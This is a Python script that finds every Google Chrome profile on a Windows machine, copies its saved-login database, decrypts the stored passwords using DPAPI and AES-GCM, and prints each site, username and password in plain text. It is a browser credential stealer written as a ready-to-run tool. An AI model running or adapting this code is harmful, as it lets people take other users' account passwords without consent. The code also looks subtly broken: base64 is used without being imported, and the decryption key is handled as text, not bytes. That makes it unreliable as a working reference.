# Author: KPFZIPOH
# Description: Retrieves and decrypts stored Google Chrome passwords with enhanced error handling,
#              support for multiple profiles, and logging functionality.
# Last Modified: June 06, 2025

import os
import shutil
import sqlite3
import logging
import win32crypt
from pathlib import Path
from Crypto.Cipher import AES
import json
from typing import List, Dict, Optional
import sys

# Configure logging for better debugging and tracking
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    filename='chrome_passwords.log'
)

class ChromePasswordExtractor:
    """Class to handle extraction and decryption of Chrome passwords."""
    
    def __init__(self):
        self.chrome_path = Path(os.environ['USERPROFILE']) / 'AppData' / 'Local' / 'Google' / 'Chrome' / 'User Data'
        self.temp_dir = Path('C:') / 'temp'
        
    def dpapi_decrypt(self, encrypted: bytes) -> Optional[str]:
        """
        Decrypts data encrypted with Windows Data Protection API (DPAPI).
        
        Args:
            encrypted (bytes): Encrypted data to decrypt
            
        Returns:
            Optional[str]: Decrypted data as string or None if decryption fails
        """
        try:
            import win32crypt
            secret = win32crypt.CryptUnprotectData(encrypted, None, None, None, 0)[1]
            return secret.decode('utf-8')
        except ImportError:
            logging.error("win32crypt module not found")
            return None
        except Exception as e:
            logging.error(f"DPAPI decryption failed: {str(e)}")
            return None

    def get_encryption_key(self, profile_path: Path) -> Optional[bytes]:
        """
        Retrieves Chrome's encryption key from Local State file.
        
        Args:
            profile_path (Path): Path to Chrome user data directory
            
        Returns:
            Optional[bytes]: Encryption key or None if retrieval fails
        """
        try:
            local_state_path = profile_path.parent / 'Local State'
            with open(local_state_path, 'r', encoding='utf-8') as f:
                local_state = json.load(f)
            
            encrypted_key = local_state.get('os_crypt', {}).get('encrypted_key')
            if not encrypted_key:
                return None
                
            # Decode base64 and remove 'DPAPI' prefix
            encrypted_key = base64.b64decode(encrypted_key)[5:]
            return self.dpapi_decrypt(encrypted_key)
        except Exception as e:
            logging.error(f"Failed to get encryption key: {str(e)}")
            return None

    def decrypt_password(self, encrypted_password: bytes, key: bytes) -> Optional[str]:
        """
        Decrypts Chrome password using AES-GCM.
        
        Args:
            encrypted_password (bytes): Encrypted password data
            key (bytes): Decryption key
            
        Returns:
            Optional[str]: Decrypted password or None if decryption fails
        """
        try:
            # Extract IV (initialization vector) and ciphertext
            iv = encrypted_password[3:15]
            ciphertext = encrypted_password[15:-16]
            
            cipher = AES.new(key, AES.MODE_GCM, iv)
            decrypted = cipher.decrypt(ciphertext).decode('utf-8')
            return decrypted
        except Exception as e:
            logging.error(f"AES decryption failed: {str(e)}")
            return None

    def get_chrome_passwords(self) -> List[Dict[str, str]]:
        """
        Retrieves saved passwords from all Chrome profiles.
        
        Returns:
            List[Dict[str, str]]: List of dictionaries containing URL, username, and password
        """
        passwords = []
        
        # Ensure temp directory exists
        self.temp_dir.mkdir(exist_ok=True)
        
        # Find all profile directories
        profile_dirs = [d for d in self.chrome_path.iterdir() if d.is_dir() and 
                       (d.name == 'Default' or d.name.startswith('Profile'))]
        
        for profile_dir in profile_dirs:
            logging.info(f"Processing profile: {profile_dir.name}")
            
            login_db = profile_dir / 'Login Data'
            if not login_db.exists():
                logging.warning(f"Login Data not found for profile {profile_dir.name}")
                continue
                
            # Create temporary copy of Login Data
            temp_file = self.temp_dir / f'Login_Data_{profile_dir.name}'
            try:
                shutil.copy2(login_db, temp_file)
                
                # Connect to database
                with sqlite3.connect(temp_file) as conn:
                    cursor = conn.cursor()
                    cursor.execute('SELECT origin_url, username_value, password_value FROM logins')
                    
                    # Get encryption key for this profile
                    key = self.get_encryption_key(profile_dir)
                    if not key:
                        logging.error(f"Could not retrieve encryption key for {profile_dir.name}")
                        continue
                        
                    # Process each login entry
                    for url, username, encrypted_password in cursor.fetchall():
                        if not all([url, username, encrypted_password]):
                            continue
                            
                        # Try DPAPI decryption first (older Chrome versions)
                        password = self.dpapi_decrypt(encrypted_password)
                        if not password:
                            # Try AES decryption (newer Chrome versions)
                            password = self.decrypt_password(encrypted_password, key)
                            
                        if password:
                            passwords.append({
                                'profile': profile_dir.name,
                                'url': url,
                                'username': username,
                                'password': password
                            })
                            logging.info(f"Successfully decrypted password for {url}")
                            
            except Exception as e:
                logging.error(f"Error processing profile {profile_dir.name}: {str(e)}")
            finally:
                # Clean up temporary file
                if temp_file.exists():
                    try:
                        temp_file.unlink()
                    except Exception as e:
                        logging.error(f"Failed to remove temp file: {str(e)}")
                        
        return passwords

def main():
    """Main function to execute password extraction and display results."""
    try:
        extractor = ChromePasswordExtractor()
        passwords = extractor.get_chrome_passwords()
        
        if not passwords:
            print("No passwords found or decryption failed.")
            return
            
        # Print results in a formatted way
        print("\nRetrieved Chrome Passwords:")
        print("-" * 50)
        for entry in passwords:
            print(f"Profile: {entry['profile']}")
            print(f"URL: {entry['url']}")
            print(f"Username: {entry['username']}")
            print(f"Password: {entry['password']}")
            print("-" * 50)
            
    except Exception as e:
        logging.error(f"Main execution failed: {str(e)}")
        print(f"An error occurred: {str(e)}")
        sys.exit(1)

if __name__ == "__main__":
    main()
